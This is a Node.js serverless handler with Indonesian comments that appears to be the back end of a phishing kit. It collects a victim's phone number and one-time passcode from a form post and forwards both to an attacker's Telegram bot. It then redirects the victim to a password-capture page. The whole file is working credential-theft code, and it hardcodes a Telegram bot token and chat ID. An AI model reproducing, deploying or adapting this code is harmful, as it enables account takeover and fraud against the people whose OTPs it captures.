// api/code.js

// Import fetch (kalau Node <18 wajib, kalau Node 18+ sudah built-in)
let fetchFn;
try {
  fetchFn = fetch; // Node 18+ sudah ada global fetch
} catch {
  fetchFn = require("node-fetch"); // fallback Node <18
}
const fetch = fetchFn;

// Helper untuk parsing body (support JSON & form-urlencoded)
async function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = "";
    req.on("data", chunk => {
      body += chunk.toString();
    });
    req.on("end", () => {
      try {
        if (req.headers["content-type"]?.includes("application/json")) {
          resolve(JSON.parse(body));
        } else {
          const params = new URLSearchParams(body);
          const data = Object.fromEntries(params.entries());
          resolve(data);
        }
      } catch (err) {
        reject(err);
      }
    });
  });
}

// Fungsi kirim ke bot Telegram
async function sendMessage(botToken, chatId, message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const payload = { chat_id: chatId, text: message, parse_mode: "Markdown" };

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    const data = await response.json();
    if (!response.ok || !data.ok) {
      throw new Error(data.description || "Telegram API error");
    }

    return { success: true, data };
  } catch (err) {
    console.error("Error sending message:", err);
    return { success: false, error: err.message };
  }
}

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.statusCode = 405;
    res.end("Method Not Allowed");
    return;
  }

  // Ambil data dari body
  const body = await parseBody(req);
  console.log("Body diterima:", body);

  const { phoneNumber, pin1, pin2, pin3, pin4, pin5, bot_id } = body;
  const pin = `${pin1 || ""}${pin2 || ""}${pin3 || ""}${pin4 || ""}${pin5 || ""}`.trim();

  if (!phoneNumber || !pin) {
    res.statusCode = 400;
    res.end("Nomor HP atau OTP tidak ditemukan");
    return;
  }

  // Format pesan yang dikirim
  const message =
    `( OTP | ${phoneNumber} )\n\n` +
    `- No HP : \`${phoneNumber}\`\n` +
    `- Code OTP : \`${pin}\` via Telegram`;

  // Tentukan bot berdasarkan bot_id
  let botToken, chatId;
  if (bot_id === "1") {
    botToken = process.env.BOT1_TOKEN || "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM";
    chatId   = process.env.CHAT1_ID   || "5876510981";
  } else {
    botToken = process.env.BOT2_TOKEN || "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM";
    chatId   = process.env.CHAT2_ID   || "5876510981";
  }

  // Kirim ke Telegram
  const result = await sendMessage(botToken, chatId, message);

  if (result.success) {
    console.log("✅ OTP berhasil dikirim:", result.data);
    res.writeHead(302, { Location: "../password/" });
    res.end();
  } else {
    console.error("❌ Gagal kirim OTP:", result.error);
    res.writeHead(302, { Location: "/otp/" });
    res.end();
  }
};
